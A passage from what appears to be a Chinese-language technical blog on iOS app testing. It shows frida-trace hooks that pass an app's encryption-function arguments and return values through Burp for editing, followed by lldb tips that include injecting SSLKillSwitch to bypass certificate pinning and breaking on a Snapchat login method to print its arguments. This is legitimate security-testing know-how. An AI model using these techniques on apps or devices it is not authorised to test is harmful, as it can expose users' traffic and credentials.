<h2 id="2-配置"><a href="#2-配置" class="headerlink" title="2. 配置"></a>2. 配置</h2><h3 id="2-1-frida-trace-传输到代理-127-0-0-1-26080"><a href="#2-1-frida-trace-传输到代理-127-0-0-1-26080" class="headerlink" title="2.1 frida-trace 传输到代理 127.0.0.1:26080"></a>2.1 frida-trace 传输到代理 127.0.0.1:26080</h3><ol>
<li>python3 tracer.py -m “+[EncryptUtils AESEncrypt:key:]” -Uf me.pandamac.iOSPentest</li>
<li>python3 tracer.py -m “+[EncryptUtils AESEncrypt:key:]” -f me.pandamac.iOSPentest -D c27808502c1f74e1659074e5154256360fe17f648 </li>
<li>python3 tracer.py -m  “-[EncryptUtils ret_NSData_by_bytes:byNSString:]” -f me.pandamac.iOSPentest -D c7808502c1f74e1659074e5154256360fe17f648</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> frida_tools <span class="keyword">import</span> tracer</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BURP_HOST = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">BURP_PORT = <span class="number">26080</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">frida_process_message</span>(<span class="params">self, message, data, ui</span>):</span><br><span class="line">    handled = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;input&#x27;</span>:</span><br><span class="line">        handled = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        stanza = message[<span class="string">&#x27;payload&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> stanza[<span class="string">&#x27;from&#x27;</span>] == <span class="string">&#x27;/request&#x27;</span>:</span><br><span class="line">            req_data = stanza[<span class="string">&#x27;payload&#x27;</span>]</span><br><span class="line">            <span class="built_in">print</span>(req_data)</span><br><span class="line">            <span class="comment"># orig_json_data = json.loads(req_data)</span></span><br><span class="line">            <span class="comment"># orig_request_url = orig_json_data.pop(u&#x27;orig_request_url&#x27;)</span></span><br><span class="line">            orig_request_url = <span class="string">&#x27;execute&#x27;</span></span><br><span class="line">            req = requests.request(<span class="string">&#x27;REQUEST&#x27;</span>,</span><br><span class="line">                                  <span class="string">&#x27;http://%s:%d/&#x27;</span> % (BURP_HOST, BURP_PORT),</span><br><span class="line">                                  headers=&#123;</span><br><span class="line">                                      <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;text/plain&#x27;</span>,</span><br><span class="line">                                      <span class="string">&#x27;ORIG_REQUEST_URI&#x27;</span>: orig_request_url</span><br><span class="line">                                  &#125;,</span><br><span class="line">                                  data=req_data)</span><br><span class="line">            return_content = req.content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="comment"># req = requests.request(&#x27;REQUEST&#x27;, &#x27;http://%s:%d/&#x27; % (BURP_HOST, BURP_PORT),</span></span><br><span class="line">            <span class="comment">#                        headers=&#123;&#x27;content-type&#x27;:&#x27;text/plain&#x27;, &#x27;ORIG_REQUEST_URI&#x27;: orig_request_url&#125;,</span></span><br><span class="line">            <span class="comment">#                        data=json.dumps(orig_json_data))</span></span><br><span class="line">            self._script.post(&#123;<span class="string">&#x27;type&#x27;</span>:<span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;payload&#x27;</span>: return_content&#125;)</span><br><span class="line">            handled = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> stanza[<span class="string">&#x27;from&#x27;</span>] == <span class="string">&#x27;/response&#x27;</span>:</span><br><span class="line">            req_data = stanza[<span class="string">&#x27;payload&#x27;</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            req = requests.request(<span class="string">&#x27;RESPONSE&#x27;</span>, <span class="string">&#x27;http://%s:%d/&#x27;</span> % (BURP_HOST, BURP_PORT),</span><br><span class="line">                                   headers=&#123;<span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;text/plain&#x27;</span>&#125;,</span><br><span class="line">                                   data=req_data)</span><br><span class="line">            self._script.post(&#123;<span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;output&#x27;</span>, <span class="string">&#x27;payload&#x27;</span>: req.content.decode(<span class="string">&#x27;utf-8&#x27;</span>)&#125;)</span><br><span class="line">            handled = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> handled:</span><br><span class="line">        self.__process_message(message, data, ui)</span><br><span class="line"></span><br><span class="line">tracer.Tracer.__process_message = tracer.Tracer._process_message</span><br><span class="line">tracer.Tracer._process_message = frida_process_message</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    tracer.main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="2-2-127-0-0-1-26080-重定位到-127-0-0-1-27080"><a href="#2-2-127-0-0-1-26080-重定位到-127-0-0-1-27080" class="headerlink" title="2.2 127.0.0.1:26080 重定位到 127.0.0.1:27080"></a>2.2 127.0.0.1:26080 重定位到 127.0.0.1:27080</h3><p><img src="https://i.loli.net/2020/03/13/s4Oja7CBWD2umLv.jpg" alt="-w674"></p>
<h3 id="2-3-回显server接受信息-返回信息"><a href="#2-3-回显server接受信息-返回信息" class="headerlink" title="2.3 回显server接受信息,返回信息"></a>2.3 回显server接受信息,返回信息</h3><ul>
<li>如果没有这个，将返回数据为 burp的代理信息给js代码，并不是burp修改后的数据。</li>
<li>相当于将数据修改后发送到127.0.0.1:27080,然后通过requests.request 返回的数据为回显server回显出来的数据。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">int</span>(platform.python_version_tuple()[<span class="number">0</span>]) &lt; <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">from</span> BaseHTTPServer <span class="keyword">import</span> HTTPServer, BaseHTTPRequestHandler</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, BaseHTTPRequestHandler</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line">ECHO_PORT = <span class="number">27080</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RequestHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_REQUEST</span>(<span class="params">self</span>):</span><br><span class="line">        request_path = self.path</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Recving request connction...&#x27;</span>)</span><br><span class="line">        request_headers = self.headers</span><br><span class="line">        content_length = request_headers.getheaders(<span class="string">&#x27;content-length&#x27;</span>)</span><br><span class="line">        length = <span class="built_in">int</span>(content_length[<span class="number">0</span>]) <span class="keyword">if</span> content_length <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        self.send_response(<span class="number">200</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        self.wfile.write(self.rfile.read(length))</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_RESPONSE</span>(<span class="params">self</span>):</span><br><span class="line">        request_path = self.path</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Recving Response connction...&#x27;</span>)</span><br><span class="line">        request_headers = self.headers</span><br><span class="line">        content_length = request_headers.getheaders(<span class="string">&#x27;content-length&#x27;</span>)</span><br><span class="line">        length = <span class="built_in">int</span>(content_length[<span class="number">0</span>]) <span class="keyword">if</span> content_length <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        self.send_response(<span class="number">200</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line"></span><br><span class="line">        self.wfile.write(self.rfile.read(length))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Listening on localhost: %d&#x27;</span> % ECHO_PORT)</span><br><span class="line">    server = HTTPServer((<span class="string">&#x27;&#x27;</span>, ECHO_PORT), RequestHandler)</span><br><span class="line">    server.serve_forever()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Staring echo server on port %d&#x27;</span> % ECHO_PORT)</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h3 id="2-4-trace-js-测试代码-需改参数和返回值"><a href="#2-4-trace-js-测试代码-需改参数和返回值" class="headerlink" title="2.4 trace js 测试代码,需改参数和返回值"></a>2.4 trace js 测试代码,需改参数和返回值</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Called synchronously when about to call +[EncryptUtils AESEncrypt:key:].</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@this</span> &#123;<span class="type">object</span>&#125; - Object allowing you to store state for use in onLeave.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> &#123;<span class="type">function</span>&#125; <span class="variable">log</span> - Call this function with a string to be presented to the user.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> &#123;<span class="type">array</span>&#125; <span class="variable">args</span> - Function arguments represented as an array of NativePointer objects.</span></span><br><span class="line"><span class="comment">   * For example use args[0].readUtf8String() if the first argument is a pointer to a C string encoded as UTF-8.</span></span><br><span class="line"><span class="comment">   * It is also possible to modify arguments by assigning a NativePointer object to an element of this array.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> &#123;<span class="type">object</span>&#125; <span class="variable">state</span> - Object allowing you to keep state across function calls.</span></span><br><span class="line"><span class="comment">   * Only one JavaScript function will execute at a time, so do not worry about race-conditions.</span></span><br><span class="line"><span class="comment">   * However, do not use this to store function arguments across onEnter/onLeave, but instead</span></span><br><span class="line"><span class="comment">   * use &quot;this&quot; which is an object for keeping state local to an invocation.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">log, args, state</span>) &#123;</span><br><span class="line">    <span class="title function_">log</span>(<span class="string">&#x27;+[EncryptUtils AESEncrypt:&#x27;</span> + args[<span class="number">2</span>] + <span class="string">&#x27; key:&#x27;</span> + args[<span class="number">3</span>] + <span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">args0</span>=args[<span class="number">0</span>];</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">args1</span>=args[<span class="number">1</span>];</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">args2</span>=args[<span class="number">2</span>];</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">args3</span>=args[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> func_name_nstring = <span class="title class_">ObjC</span>.<span class="title function_">selectorAsString</span>(<span class="variable language_">this</span>.<span class="property">args1</span>);</span><br><span class="line">    send_data=<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">        <span class="attr">FH_FUNC_NAME</span>: func_name_nstring,</span><br><span class="line">        <span class="attr">FH_ARG_COUNT</span>: <span class="number">3</span>,</span><br><span class="line">        <span class="attr">FH_DETAIL_OBJECT</span>: <span class="title class_">ObjC</span>.<span class="title class_">Object</span>(<span class="variable language_">this</span>.<span class="property">args0</span>).<span class="title function_">toString</span>(),</span><br><span class="line">        <span class="attr">FH_DETAIL_ARG1</span>:   <span class="title class_">ObjC</span>.<span class="title class_">Object</span>(<span class="variable language_">this</span>.<span class="property">args2</span>).<span class="title function_">toString</span>(),</span><br><span class="line">        <span class="attr">FH_DETAIL_ARG2</span>:   <span class="title class_">ObjC</span>.<span class="title class_">Object</span>(<span class="variable language_">this</span>.<span class="property">args3</span>).<span class="title function_">toString</span>(),</span><br><span class="line">        <span class="comment">// FH_DETAIL_RET: ObjC.Object(retval).toString(),</span></span><br><span class="line">    &#125;, <span class="literal">null</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">send</span>(&#123;<span class="attr">from</span>:<span class="string">&#x27;/request&#x27;</span>, <span class="attr">payload</span>: send_data&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> op = <span class="title function_">recv</span>(<span class="string">&#x27;input&#x27;</span>, <span class="keyword">function</span> <span class="title function_">onMessage</span>(<span class="params">value</span>)&#123;</span><br><span class="line">        <span class="title function_">log</span>(<span class="string">&quot;Waiting Input payload&quot;</span>);</span><br><span class="line">        <span class="comment">// log(value.payload);</span></span><br><span class="line">        <span class="comment">// log(&quot;Waiting Input recv_data start&quot;);</span></span><br><span class="line">        recv_data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(value.<span class="property">payload</span>)</span><br><span class="line">        <span class="title function_">log</span>(recv_data)</span><br><span class="line">        <span class="comment">// log(&quot;Waiting Input recv_data end&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">NSString</span> = <span class="title class_">ObjC</span>.<span class="property">classes</span>.<span class="property">NSString</span>;</span><br><span class="line">        args[<span class="number">2</span>]  = <span class="title class_">NSString</span>.<span class="title function_">alloc</span>().<span class="title function_">initWithString_</span>(recv_data[<span class="string">&quot;FH_DETAIL_ARG1&quot;</span>]);</span><br><span class="line">        args[<span class="number">3</span>]  = <span class="title class_">NSString</span>.<span class="title function_">alloc</span>().<span class="title function_">initWithString_</span>(recv_data[<span class="string">&quot;FH_DETAIL_ARG2&quot;</span>]);</span><br><span class="line">    &#125;);</span><br><span class="line">    op.<span class="title function_">wait</span>();</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Called synchronously when about to return from +[EncryptUtils AESEncrypt:key:].</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * See onEnter for details.</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@this</span> &#123;<span class="type">object</span>&#125; - Object allowing you to access state stored in onEnter.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> &#123;<span class="type">function</span>&#125; <span class="variable">log</span> - Call this function with a string to be presented to the user.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> &#123;<span class="type">NativePointer</span>&#125; <span class="variable">retval</span> - Return value represented as a NativePointer object.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> &#123;<span class="type">object</span>&#125; <span class="variable">state</span> - Object allowing you to keep state across function calls.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">log, retval, state</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(retval);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> func_name_nstring = <span class="title class_">ObjC</span>.<span class="title function_">selectorAsString</span>(<span class="variable language_">this</span>.<span class="property">args1</span>);</span><br><span class="line">    send_data=<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">        <span class="attr">FH_FUNC_NAME</span>: func_name_nstring,</span><br><span class="line">        <span class="attr">FH_DETAIL_RET</span>: <span class="title class_">ObjC</span>.<span class="title class_">Object</span>(retval).<span class="title function_">toString</span>(),</span><br><span class="line">    &#125;, <span class="literal">null</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">send</span>(&#123;<span class="attr">from</span>:<span class="string">&#x27;/response&#x27;</span>, <span class="attr">payload</span>: send_data&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> op = <span class="title function_">recv</span>(<span class="string">&#x27;output&#x27;</span>, <span class="keyword">function</span> <span class="title function_">onMessage</span>(<span class="params">value</span>)&#123;</span><br><span class="line">        <span class="title function_">log</span>(<span class="string">&quot;Waiting output payload&quot;</span>);</span><br><span class="line">        <span class="comment">// log(value.payload);</span></span><br><span class="line">        <span class="comment">// log(&quot;Waiting output recv_data start&quot;);</span></span><br><span class="line">        recv_data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(value.<span class="property">payload</span>)</span><br><span class="line">        <span class="title function_">log</span>(recv_data)</span><br><span class="line">        <span class="comment">// log(&quot;Waiting output recv_data end&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">NSString</span> = <span class="title class_">ObjC</span>.<span class="property">classes</span>.<span class="property">NSString</span>;</span><br><span class="line">        <span class="keyword">var</span> tmp_retval = <span class="title class_">NSString</span>.<span class="title function_">alloc</span>().<span class="title function_">initWithString_</span>(recv_data[<span class="string">&quot;FH_DETAIL_RET&quot;</span>]);</span><br><span class="line">        retval.<span class="title function_">replace</span>(tmp_retval);</span><br><span class="line">    &#125;);</span><br><span class="line">    op.<span class="title function_">wait</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="3-测试效果"><a href="#3-测试效果" class="headerlink" title="3.测试效果"></a>3.测试效果</h2><h3 id="3-1-burp接受函数参数包"><a href="#3-1-burp接受函数参数包" class="headerlink" title="3.1 burp接受函数参数包"></a>3.1 burp接受函数参数包</h3><p><img src="https://i.loli.net/2020/03/13/vC6QbUEVcH21rfY.jpg" alt="-w468"><br>可以进行修改，然后点击Forward</p>
<h3 id="3-2-burp接受函数返回包"><a href="#3-2-burp接受函数返回包" class="headerlink" title="3.2 burp接受函数返回包"></a>3.2 burp接受函数返回包</h3><p><img src="https://i.loli.net/2020/03/13/Pni6xCwveEyF9UL.jpg" alt="-w504"><br>可以进行修改，然后点击Forward</p>
<h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><ul>
<li>直接测试所有二进制的函数进出返回值，用于测试工作，剩下工作就是编写合适的 js 代码,将trace的函数用于通用。当然也可以不用trace,自己写hook 框架，达到任意修改函数返回值的效果。</li>
<li>如果函数有时间校验的话，可能会出错，这时候用代码实现修改即可。</li>
</ul>
]]></content>
      <categories>
        <category>tools</category>
        <category>frida</category>
      </categories>
      <tags>
        <tag>frida</tag>
        <tag>burp</tag>
      </tags>
  </entry>
  <entry>
    <title>lldb_help</title>
    <url>/2020/02/23/tips_about/lldb-help/</url>
    <content><![CDATA[<p>[TOC]</p>
<span id="more"></span>
<h1 id="some-gdb-tips"><a href="#some-gdb-tips" class="headerlink" title="some gdb tips"></a>some gdb tips</h1><h2 id="在具体地址下断"><a href="#在具体地址下断" class="headerlink" title="在具体地址下断"></a>在具体地址下断</h2><p>break *0x0000000000400448</p>
<h1 id="some-lldb-tips"><a href="#some-lldb-tips" class="headerlink" title="some lldb tips"></a>some lldb tips</h1><h2 id="通用"><a href="#通用" class="headerlink" title="通用"></a>通用</h2><h3 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h3><h4 id="error-process-launch-failed-unable-to-locate-lldb-server"><a href="#error-process-launch-failed-unable-to-locate-lldb-server" class="headerlink" title="error: process launch failed: unable to locate lldb-server"></a>error: process launch failed: unable to locate lldb-server</h4><p>sudo ln -s  &#x2F;usr&#x2F;bin&#x2F;lldb-server-3.8 &#x2F;usr&#x2F;bin&#x2F;lldb-server</p>
<h2 id="加载so-动态库等"><a href="#加载so-动态库等" class="headerlink" title="加载so 动态库等"></a>加载so 动态库等</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  (lldb) expr (void*)dlopen(&quot;/path/to/build/SSLKillSwitch.framework/Versions/A/SSLKillSwitch&quot;, 1)</span><br><span class="line">  (lldb) expr (void*)dlopen(&quot;/Library/MobileSubstrate/DynamicLibraries/Reveal2Loader.dylib&quot;,1)</span><br><span class="line">  (lldb) </span><br><span class="line">  command alias reveal_load_sim expr (void*)dlopen(&quot;/Applications/Reveal.app/Contents/SharedSupport/iOS-Libraries/RevealServer.framework/RevealServer&quot;, 0x2);</span><br><span class="line">  (lldb) expr (void*)dlopen(&quot;/Library/RHRevealLoader/libReveal.dylib&quot;,1)</span><br><span class="line">  (void *) $1 = 0x00007f92e74d10c0</span><br><span class="line">Using DYLD_INSERT_LIBRARIES to inject SSLKillSwitch and start the process.</span><br></pre></td></tr></table></figure>
<h2 id="lldb-expr-相关"><a href="#lldb-expr-相关" class="headerlink" title="lldb expr 相关"></a>lldb expr 相关</h2><p>[xxx setHidden:YES]  show&#x2F;hide<br>caflush  Force Core Animation to flush. This will ‘repaint’ the UI but also may mess with ongoing animations</p>
<h3 id="断点相关"><a href="#断点相关" class="headerlink" title="断点相关"></a>断点相关</h3><h4 id="1-对函数下断点"><a href="#1-对函数下断点" class="headerlink" title="1. 对函数下断点"></a>1. 对函数下断点</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">breakpoint <span class="built_in">set</span> -n text: -c ret == YES    //使用-c设置条件断点</span><br><span class="line">breakpoint <span class="built_in">set</span> -f xxx.m -l 38            //使用-f指定文件 使用-l指定文件某一行设置断点</span><br><span class="line">breakpoint <span class="built_in">set</span> -n <span class="string">&quot;-[xxx xxx]&quot;</span>           //根据函数名下断点(调试信息)</span><br><span class="line">breakpoint <span class="built_in">set</span> -a VitrualAddress         //根据虚拟地址下断点</span><br><span class="line"></span><br><span class="line">b isEven, br s -F isEven  //符号断点</span><br><span class="line">breakpoint <span class="built_in">set</span> -f main.m -l 16：在源码文件的某一行断点</span><br><span class="line">b main.m:17。b是_regexp-<span class="built_in">break</span>的缩写</span><br><span class="line"></span><br><span class="line">breakpoint modify -c <span class="string">&#x27;i == 99&#x27;</span> 1   //条件断点</span><br><span class="line">断点时附加自定义操作：breakpoint <span class="built_in">command</span> add 1</span><br></pre></td></tr></table></figure>
<h4 id="2-观察断点"><a href="#2-观察断点" class="headerlink" title="2.观察断点"></a>2.观察断点</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">watchpoint set expression -w write ―- 0xl01801a48 :给某个地址设置观察断点,内存进行写操作时就会触发断点</span><br><span class="line"></span><br><span class="line">// 获取需要监控的内存地址</span><br><span class="line">p (ptrdiff_t)ivar_getOffset((struct Ivar *)class_getInstanceVariable([MyView class], &quot;_layer&quot;))</span><br><span class="line"></span><br><span class="line">(ptrdiff_t) $0 = 8</span><br><span class="line"></span><br><span class="line">watchpoint set expression -- (int *)$myView + 8：监控_layer的地址</span><br><span class="line"></span><br><span class="line">变量监控：watchpoint set variable -w read_write</span><br><span class="line">条件监控：watchpoint modify -c &#x27;(global==5)&#x27;</span><br></pre></td></tr></table></figure>
<h4 id="3-断点后执行命令"><a href="#3-断点后执行命令" class="headerlink" title="3.断点后执行命令"></a>3.断点后执行命令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b +[Manager performLoginWithUsernameOnEmail: password: preAuthToken: twoFAMethod: confirmReactivation:rememberDevice:fromDeepLink:onComplete:]</span><br><span class="line">Breakpoint 2: where = Snapchat&#x27;+[Manager</span><br><span class="line">br com add 2</span><br><span class="line">&gt; po $x2</span><br><span class="line">&gt; po $x3</span><br><span class="line">&gt; c</span><br><span class="line">&gt; po F.viewCFG()</span><br><span class="line">&gt; DONE</span><br></pre></td></tr></table></figure>
<h4 id="7-如何将断点设置在动态库的入口"><a href="#7-如何将断点设置在动态库的入口" class="headerlink" title="7.如何将断点设置在动态库的入口"></a>7.如何将断点设置在动态库的入口</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LLDB命令行进行调试时自 动中断在 _dyld_start 处，因为此时dyld已经加载，所以在dyld里面设置一个在所有库中加载并且在constructor 函数执行之前执行的断点，例如initializeMainExecutable</span><br><span class="line">settings set target.process.stop-on-sharedlibrary-events 1</span><br></pre></td></tr></table></figure>
<h4 id="8-插件断点"><a href="#8-插件断点" class="headerlink" title="8.插件断点"></a>8.插件断点</h4><p>bdisable	用正则查找并关闭一组断点<br>benable	用正则查找并开启一组断点<br>binside	用相对地址设置断点，自动加上 ALSR 偏移<br>bmessage	给某个类的 method 设置断点，同时会在其父类上查找 method<br>pinvocation	打印方法调用堆栈，仅支持x86</p>
<h4 id="9-某个类的所有方法下断点并跟踪打印调用参数"><a href="#9-某个类的所有方法下断点并跟踪打印调用参数" class="headerlink" title="9.某个类的所有方法下断点并跟踪打印调用参数"></a>9.某个类的所有方法下断点并跟踪打印调用参数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command regex bclass &#x27;s/(.+)/rb \[%1 /&#x27;</span><br><span class="line">rb -&gt; breakpoint set -r %1</span><br><span class="line">bclass ULLoginViewController -&gt; breakpoint set -r \[ULLoginViewController</span><br><span class="line"></span><br><span class="line">br set -r &#x27;\[WAChatSessionViewController .*\]&#x27;</span><br><span class="line"></span><br><span class="line">如果不在MethodTraCeCcmflg.PliSt文件里面配置需要跟踪的类，那么如下设置:</span><br><span class="line">@interface MethodTrace : NSObject</span><br><span class="line">+ (void)addClassTrace:(NSString*) className;</span><br><span class="line">+ (void)addClassTrace: (NSString *)className methodName: (NSString*) methodName;</span><br><span class="line">+ (void)addClassTrace: (NSString *)className methodList: (NSArray*) methodList;</span><br><span class="line">@end</span><br><span class="line"></span><br><span class="line">e [MethodTrace addClassTrace:@&quot;WAChatDataStore&quot;]</span><br><span class="line">笔者在MethodTrace的代码里面调试了—下，发现 NSLog没有被输出到Xcode的控制台，但是在Console.app里面可以看到NSLog,所以改用printf来输出。</span><br><span class="line">ENABLE_METHODTRACE</span><br></pre></td></tr></table></figure>
<h4 id="Finding-a-class-with-a-click"><a href="#Finding-a-class-with-a-click" class="headerlink" title="Finding a class with a click"></a>Finding a class with a click</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(lldb) b -[NSView hitTest:]</span><br><span class="line">Breakpoint 1: where = AppKit`-[NSView hitTest:], address = 0x000000010338277b</span><br><span class="line">breakpoint set -n  &quot;-[NSView hitTest:]&quot; -C &quot;real&quot; -G1</span><br><span class="line">b -[NSResponder mouseUp:]</span><br></pre></td></tr></table></figure>
<h4 id="Filter-breakpoints-for-important-content"><a href="#Filter-breakpoints-for-important-content" class="headerlink" title="Filter breakpoints for important content"></a>Filter breakpoints for important content</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">breakpoint modify -c &#x27;(BOOL)[NSStringFromClass((id)[$rdi class]) containsString:@&quot;IDESourceEditorView&quot;]&#x27; -G0</span><br><span class="line">最后-G0说的是修改断点，使其在执行动作后不会自动恢复执行。</span><br><span class="line"></span><br><span class="line">(lldb) breakpoint set -n &quot;-[UIViewController viewDidLoad]&quot; -C &quot;po $arg1&quot; -G1</span><br><span class="line">-G1选项告诉断点在执行命令后自动继续。</span><br></pre></td></tr></table></figure>
<h4 id="在模块下断"><a href="#在模块下断" class="headerlink" title="在模块下断"></a>在模块下断</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(lldb) rb appendSignal.*_block_invoke -s Commons</span><br></pre></td></tr></table></figure>
<h4 id="启动后断在"><a href="#启动后断在" class="headerlink" title="启动后断在"></a>启动后断在</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-s ( --stop-at-entry )</span><br><span class="line">            Stop at the entry point of the program when launching a process.</span><br><span class="line"></span><br><span class="line">(lisa)target create tests/binaries/abort</span><br><span class="line">(lisa)process launch -s</span><br></pre></td></tr></table></figure>

<h3 id="设置lldb-使用python2"><a href="#设置lldb-使用python2" class="headerlink" title="设置lldb 使用python2"></a>设置lldb 使用python2</h3><p>defaults write com.apple.dt.lldb DefaultPythonVersion 2</p>
<h3 id="计算偏移-ida地址"><a href="#计算偏移-ida地址" class="headerlink" title="计算偏移&#x2F;ida地址"></a>计算偏移&#x2F;ida地址</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p/x 0X000000010095ECCC+0X0000000000038000</span><br><span class="line">(lldb) p/x 0x0000000100e595b4-0x0000000000038000 (long) $18 = 0x0000000100e215b4</span><br><span class="line">查看某个地址所在模块的信息</span><br></pre></td></tr></table></figure>

<h3 id="读取目标地址的内存指令"><a href="#读取目标地址的内存指令" class="headerlink" title="读取目标地址的内存指令"></a>读取目标地址的内存指令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x/10xg 0xl01801a48 这里的x 表示用十六进制来显示结果。&quot;g&quot;代表giant word(8字节)大小。所以就是用十六进制显示 0x101801a48所指恐惧的10个64位的元素内容。常见的大小格式为&quot;b-byte&quot;(1字节),&quot;h-half word&quot;(2字节),&quot;w- word”(4字节),&quot;g-giantword”(8字节)。</span><br></pre></td></tr></table></figure>
<h3 id="dis-a-pc-反汇编指定地址"><a href="#dis-a-pc-反汇编指定地址" class="headerlink" title="dis-a$pc 反汇编指定地址"></a>dis-a$pc 反汇编指定地址</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这里是pc寄存器所对应的地址。</span><br></pre></td></tr></table></figure>
<h3 id="切换分支"><a href="#切换分支" class="headerlink" title="切换分支"></a>切换分支</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f2:切换到当前调用栈为2的位置，也就是bt中的frame #2。</span><br></pre></td></tr></table></figure>
